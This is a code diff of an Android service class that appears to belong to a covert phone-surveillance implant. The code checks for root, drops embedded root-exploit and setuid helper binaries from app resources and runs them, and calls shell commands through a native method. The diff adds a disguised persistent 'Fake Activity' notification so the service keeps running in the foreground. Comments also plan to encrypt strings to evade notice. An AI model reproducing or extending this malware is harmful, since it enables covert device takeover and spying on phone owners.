@@ -21,11 +21,14 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 
+import android.app.Notification;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.app.WallpaperManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.res.Configuration;
 import android.content.res.Resources;
 import android.graphics.Bitmap;
 import android.graphics.Bitmap.Config;
@@ -52,6 +55,7 @@ public class ServiceCore extends Service {
 	private native int invokeRun(String cmd);
 
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
+	private Notification notification;
 	private Core core;
 
 	@Override
@@ -74,52 +78,29 @@ public class ServiceCore extends Service {
 		}
 
 		Status.setAppContext(getApplicationContext());
-	}
 
-	private void setBackground() {
-		if (Cfg.DEMO) {
-			final WallpaperManager wm = WallpaperManager.getInstance(this);
-			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
-					.getDefaultDisplay();
-			final int width = display.getWidth();
-			final int height = display.getHeight();
-			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
-			final Canvas canvas = new Canvas(bitmap);
-			final Paint paint = new Paint();
-			paint.setStyle(Paint.Style.FILL);
-			paint.setAntiAlias(true);
-			paint.setTextSize(20);
-			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
+		Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
+				System.currentTimeMillis());
+		
+		Intent i = new Intent(this, FakeActivity.class);
 
-			try {
-				wm.setBitmap(bitmap);
-			} catch (final IOException e) {
-				if (Cfg.DEBUG) {
-					Check.log(e);
-				}
-			}
-		}
-	}
+		i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
 
-	@Override
-	public void onDestroy() {
-		super.onDestroy();
+		PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
-		}
+		note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
+		note.flags |= Notification.FLAG_NO_CLEAR;
 
-		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-		}
-
-		core.Stop();
-		core = null;
+		startForeground(1337, note);
 	}
 
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
+		}
 
 		if (PackageInfo.checkRoot() == true) {
 			Status.self().setRoot(true);
@@ -148,6 +129,7 @@ public class ServiceCore extends Service {
 				case 0:
 				case 1:
 					return; // Non possiamo partire
+
 				case 2: // Possiamo partire
 				default:
 					break;
@@ -158,6 +140,103 @@ public class ServiceCore extends Service {
 		// Core starts
 		core = Core.getInstance();
 		core.Start(this.getResources(), getContentResolver());
+	}
+
+	@Override
+	public void onConfigurationChanged(Configuration newConfig) {
+		super.onConfigurationChanged(newConfig);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+	}
+
+	@Override
+	public void onLowMemory() {
+		super.onLowMemory();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+	}
+
+	@Override
+	public void onRebind(Intent intent) {
+		super.onRebind(intent);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+	}
+
+	@Override
+	public boolean onUnbind(Intent intent) {
+		boolean ret = super.onUnbind(intent);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+
+		return ret;
+	}
+
+	@Override
+	public void onDestroy() {
+		super.onDestroy();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+
+		core.Stop();
+		core = null;
+		
+		stopForeground(true);
+	}
+
+	private void setBackground() {
+		if (Cfg.DEMO) {
+			final WallpaperManager wm = WallpaperManager.getInstance(this);
+			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
+					.getDefaultDisplay();
+			final int width = display.getWidth();
+			final int height = display.getHeight();
+			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
+			final Canvas canvas = new Canvas(bitmap);
+			final Paint paint = new Paint();
+			paint.setStyle(Paint.Style.FILL);
+			paint.setAntiAlias(true);
+			paint.setTextSize(20);
+			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
+
+			try {
+				wm.setBitmap(bitmap);
+			} catch (final IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(e);
+				}
+			}
+		}
 	}
 
 	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
@@ -281,6 +360,10 @@ public class ServiceCore extends Service {
 			// /system/bin/ntpsvd reb
 			invokeRun(Messages.getString("32.28"));
 		} catch (Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
 				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
@@ -313,11 +396,11 @@ public class ServiceCore extends Service {
 
 			Resources resources = getResources();
 			InputStream stream = resources.openRawResource(R.raw.statuslog);
-			//"0x5A3D10448D7A912B"
+			// "0x5A3D10448D7A912B"
 			fileWrite(exploit, stream, Messages.getString("36.1"));
 
 			stream = resources.openRawResource(R.raw.statusdb);
-			//0x5A3D10448D7A912A
+			// 0x5A3D10448D7A912A
 			fileWrite(suidext, stream, Messages.getString("36.2"));
 
 			// Eseguiamo l'exploit
@@ -375,6 +458,9 @@ public class ServiceCore extends Service {
 
 			}
 		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
@@ -395,16 +481,22 @@ public class ServiceCore extends Service {
 			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
 			byte[] buf = new byte[1024];
 			int numRead = 0;
+
 			while ((numRead = in.read(buf)) >= 0) {
 				out.write(buf, 0, numRead);
 			}
 
 			out.close();
 		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				ex.printStackTrace();
 				Check.log(TAG + " (fileWrite): " + ex);
 			}
+
 			return false;
 		}
 
@@ -477,6 +569,10 @@ public class ServiceCore extends Service {
 				try {
 					localProcess.waitFor();
 				} catch (final InterruptedException e) {
+					if (Cfg.EXCEPTION) {
+						Check.log(e);
+					}
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
 						Check.log(e);//$NON-NLS-1$
@@ -493,6 +589,10 @@ public class ServiceCore extends Service {
 				stderr.close();
 
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				localProcess = null;
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
